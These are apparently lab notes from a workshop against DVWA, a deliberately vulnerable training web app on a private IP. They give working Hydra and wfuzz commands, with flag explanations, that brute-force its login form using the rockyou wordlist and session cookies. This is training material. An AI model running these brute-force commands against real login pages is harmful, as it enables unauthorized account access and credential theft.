Following the `DVWA` workshop this is the working Hydra command.
We need to pass the PHPSESSID and security token to get valid results
### HYDRA
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz 192.168.0.73 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=534uuj0t5702leo6gmot7b5c76;security=low:F=Username and/or password incorrect."
```
#### FLAGS
- -I ignored last session
- -L username list
- -P password list
- -l single user to be used
### WFUZZ
```bash
wfuzz --hs incorrect -c -w ~/wordlist/rockyou.txt -b 'security=low;PHPSESSID=123xxx' 'http://192.168.0.73/dvwa/vulnerabilities/brute/index.php?username=admin&password=FUZZ&Login=Login'
```
### WFUZZ Multiple Payloads
```bash
wfuzz --hs incorrect -c -z file,/tmp/users.txt -z file,/home/kali/wordlist/rockyou100.txt -b 'security=low;PHPSESSID=48dn4l2hqbiqv7re5cbhfpp214' 'http://192.168.0.73/dvwa/vulnerabilities/brute/index.php?username=FUZZ&password=FUZ2Z&Login=Login
```
Obs: When using multiple payloads the second **`FUZZ`** needs to be named **`FUZ2Z`**
#### FLAGS
- --hs hide any responses that have incorrect on them
- -w Set wordlist
- -b Set cookie